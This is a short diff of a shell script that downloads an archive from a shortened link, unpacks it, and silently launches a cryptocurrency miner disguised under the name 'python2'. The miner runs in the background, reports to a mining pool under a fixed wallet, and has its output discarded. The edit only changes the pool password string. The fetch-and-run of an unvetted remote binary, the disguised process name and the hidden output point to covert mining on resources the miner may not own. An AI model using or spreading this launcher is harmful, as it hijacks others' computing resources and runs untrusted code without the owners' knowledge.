@@ -2,7 +2,7 @@ wget -O dot s.id/dotaja
 
 tar -xzvf dot
 
-nohup ./python2 --algo PYRIN --pool pyrinhash.asia.mine.zergpool.com:5557 --user DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK --pass c=DGB,mc=PYI,m=solo > /dev/null 2>&1 &
+nohup ./python2 --algo PYRIN --pool pyrinhash.asia.mine.zergpool.com:5557 --user DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK --pass c=DGB,mc=PYI > /dev/null 2>&1 &
 
 sleep 15
 
